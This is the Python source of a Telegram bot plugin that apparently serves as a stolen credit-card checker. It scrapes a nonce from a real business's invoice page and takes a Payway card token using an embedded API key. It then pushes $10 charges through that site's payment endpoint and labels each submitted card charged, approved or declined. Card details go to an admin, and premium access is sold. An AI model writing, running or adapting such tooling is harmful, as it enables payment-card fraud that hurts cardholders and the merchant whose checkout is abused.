"""
Payway Gateway Plugin
Commands: /pw, .pw, !pw, $pw
Charge: $10
"""

import requests
import re
import time
import asyncio
from pyrogram import Client, filters
from pyrogram.enums import ParseMode

import sys
sys.path.append('..')
from utils.card_utils import extract_card_info
from utils.bin_lookup import get_bin_info
from utils.response_formatter import get_response_keyboard

# Plugin metadata
PLUGIN_INFO = {
    'name': 'Payway',
    'commands': ['pw'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'Payway payment gateway - $10 charge',
    'type': 'charge',
    'status': 'active'
}

def categorize_payway_response(payment_response):
    """Categorize Payway response"""
    success = payment_response.get('success', False)
    message = payment_response.get('message', '').lower()
    
    if success:
        return 'charged', 'Charged 🔥'
    
    # Check for approval keywords
    insufficient_keywords = ['insufficient', 'sufficient', 'funds', 'withdrawal limits', 'approved']
    if any(keyword in message for keyword in insufficient_keywords):
        return 'approved', message.title()
    
    return 'declined', message.title()

def get_status_emoji(category):
    """Get emoji for status category"""
    emoji_map = {
        'charged': 'Charged 🔥',
        'approved': '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅',
        'declined': '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌'
    }
    return emoji_map.get(category, '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌')

def format_payway_response(card_info, response_message, bin_info, execution_time, category):
    """Format Payway response for Telegram"""
    card, month, year, cvv = card_info
    cc_display = f"`{card}|{month}|{year}|{cvv}`"
    
    status_text = get_status_emoji(category)
    
    response_text = f"{status_text}\n\n"
    response_text += f"㊕ 𝗖𝗖 ⇾ {cc_display}\n"
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Payway $10\n"
    response_text += f"㊕ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {response_message}\n\n"
    
    # Add BIN info if available
    if bin_info:
        response_text += f"㊕ 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('vendor', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}\n"
        response_text += f"㊕ 𝗕𝗮𝗻𝗸: {bin_info.get('bank_name', 'N/A')}\n"
        response_text += f"㊕ 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'N/A')} {bin_info.get('flag', '')}\n\n"
    
    response_text += f"㊕ 𝗧𝗼𝗼𝗸 {execution_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    
    return response_text

class PaywayGateway:
    def __init__(self):
        self.base_headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8"
        }
    
    def get_fresh_nonce(self):
        """Get fresh nonce from website"""
        url = "https://www.coriowm.com.au/pay-an-invoice/"
        
        headers = self.base_headers.copy()
        headers.update({
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "none",
            'sec-fetch-mode': "navigate",
            'sec-fetch-dest': "document"
        })
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            
            if response.status_code == 200:
                pattern = r'var\s+payway_ajax\s*=\s*\{[^}]+\"nonce\"\s*:\s*\"([^\"]+)\"'
                match = re.search(pattern, response.text)
                
                if match:
                    return match.group(1)
        except Exception as e:
            print(f"Nonce error: {e}")
        
        return None
    
    def get_single_use_token(self, card, month, year, cvv):
        """Get single use token from Payway"""
        url = "https://api.payway.com.au/rest/v1/single-use-tokens"
        
        # Ensure year is 2 digits
        if len(year) == 4:
            year = year[2:]
        
        payload = {
            'paymentMethod': "creditCard",
            'connectionType': "FRAME",
            'cardNumber': card,
            'cvn': cvv,
            'cardholderName': "Card Holder",
            'expiryDateMonth': month,
            'expiryDateYear': year,
            'threeDS2': "false"
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': '"Android"',
            'authorization': "Basic UTE4Mzc1X1BVQl8yc3VxNmt4M3pha2JtdTR6dWQ0eDVhM2ZyZG14eXpxOGlpbnoydjZ4emN5cGs1MnR6YWFzN2dwbWp6ZWk6",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': "?1",
            'x-no-authenticate-basic': "true",
            'x-requested-with': "XMLHttpRequest",
            'origin': "https://api.payway.com.au",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'sec-fetch-storage-access': "none",
            'referer': "https://api.payway.com.au/rest/v1/creditCard-iframe.htm",
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
            'priority': "u=1, i"
        }
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=30)
            
            if response.status_code == 200:
                token_data = response.json()
                return token_data.get('singleUseTokenId')
        except Exception as e:
            print(f"Token error: {e}")
        
        return None
    
    def process_payment(self, card_token, nonce):
        """Process payment"""
        url = "https://www.coriowm.com.au/wp-admin/admin-ajax.php"
        
        payload = {
            'action': "payway_process_payment",
            'nonce': nonce,
            'amount': "10.00",
            'description': "TEST",
            'customer_number': "45",
            'order_number': "16",
            'card_token': card_token
        }
        
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.coriowm.com.au",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.coriowm.com.au/pay-an-invoice/",
            'accept-language': "en-GB,en-US;q=0.9,en;q=0.8",
            'priority': "u=1, i",
            'Cookie': "_ga=GA1.1.1762305980.1770466181; _gcl_au=1.1.1705154.1770466182; _ga_E3WSL1ZFDL=GS2.1.1770687858.2.1.1770688057.59.0.0"
        }
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=30)
            
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"Payment error: {e}")
        
        return {"success": False, "message": f"Error: {str(e)}"}
    
    async def check_card(self, card, month, year, cvv):
        """Main function to check card through Payway"""
        start_time = time.time()
        
        try:
            # Step 1: Get nonce
            nonce = self.get_fresh_nonce()
            if not nonce:
                return None, "Failed to get nonce", time.time() - start_time
            
            # Step 2: Get card token
            card_token = self.get_single_use_token(card, month, year, cvv)
            if not card_token:
                return None, "Failed to get token", time.time() - start_time
            
            # Step 3: Process payment
            payment_result = self.process_payment(card_token, nonce)
            
            execution_time = time.time() - start_time
            return payment_result, None, execution_time
            
        except Exception as e:
            execution_time = time.time() - start_time
            return None, f"Error: {str(e)}", execution_time

# Register command handlers
def setup(app: Client):
    """Setup function called when plugin is loaded"""
    
    @app.on_message(filters.command(["pw"], prefixes=[".", "/", "!", "$"]))
    async def pw_command(client, message):
        """Handle /pw command"""
        from utils.admin import check_banned, check_maintenance, check_gateway_access, forward_to_admin_if_enabled
        from utils.database import db
        
        user_id = message.from_user.id
        username = message.from_user.username
        
        # Add user to database
        db.add_user(user_id, username)
        
        # Check if banned
        if await check_banned(client, message):
            return
        
        # Check if maintenance
        if await check_maintenance(client, message):
            return
        
        # Check gateway access
        can_access, reason = await check_gateway_access(user_id, 'pw')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
                keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Buy", url="https://t.me/themigel")
                ]])
                await message.reply_text(
                    "<b>Only available to Premium users !</b>",
                    parse_mode=ParseMode.HTML,
                    reply_markup=keyboard
                )
                return
        
        # Extract card info from message or reply
        text = None
        if message.reply_to_message:
            text = message.reply_to_message.text
        elif message.text:
            command_text = message.text.strip()
            command_parts = command_text.split(maxsplit=1)
            if len(command_parts) > 1:
                text = command_parts[1]
        
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝙋𝙖𝙮𝙬𝙖𝙮 - CHARGE

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» Payway $10

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /pw cc|month|year|cvc"""
            await message.reply_text(resp, parse_mode=ParseMode.HTML)
            return
        
        # Extract card info
        card_info = extract_card_info(text)
        if not card_info:
            await message.reply_text("❌ Invalid card format. Use: cc|month|year|cvv")
            return
        
        # Validate card with Luhn algorithm
        from utils.gateway_middleware import validate_card_with_luhn
        if not await validate_card_with_luhn(card_info, "Payway $10", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'pw')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card
        gateway = PaywayGateway()
        payment_result, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'pw')
        
        # Get BIN info
        bin_info = get_bin_info(card)
        
        if error:
            # Error occurred
            response_text = format_payway_response(
                card_info=(card, month, year, cvv),
                response_message=error,
                bin_info=bin_info,
                execution_time=execution_time,
                category='declined'
            )
        else:
            # Parse response
            category, response_message = categorize_payway_response(payment_result)
            
            response_text = format_payway_response(
                card_info=(card, month, year, cvv),
                response_message=response_message,
                bin_info=bin_info,
                execution_time=execution_time,
                category=category
            )
        
        # Update progress message with result
        keyboard = get_response_keyboard()
        await progress_msg.edit_text(
            response_text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=keyboard
        )
    
    print("✅ Payway gateway commands registered")